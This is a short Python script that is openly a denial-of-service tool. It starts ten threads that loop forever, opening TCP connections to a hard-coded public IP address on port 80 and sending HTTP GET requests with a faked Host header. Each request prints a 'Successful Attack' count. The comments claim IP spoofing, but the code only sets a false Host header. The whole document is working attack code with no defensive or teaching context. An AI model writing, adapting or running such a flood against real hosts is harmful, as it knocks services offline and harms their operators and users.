import socket
import threading

# Target IP and fake IP for spoofing (use a valid IP address)
target = "217.15.165.191"
fake_ip = "192.168.1.100"  # Correct fake IP (use a valid one)
port = 80

attack_num = 0

# Attack function
def attack():
    global attack_num
    while True:
        try:
            # Create a new socket object
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((target, port))

            # Send HTTP GET request with fake headers
            soc.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (target, port))
            soc.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))

            # Increment the attack counter
            attack_num += 1
            print(f'Successful Attack on {target}: {attack_num}')

            # Close the socket connection
            soc.close()
        except Exception as e:
            print(f"Error occurred: {e}")
            continue

# Create and start multiple threads to launch the attack
for i in range(10):
    thread = threading.Thread(target=attack)
    thread.start()
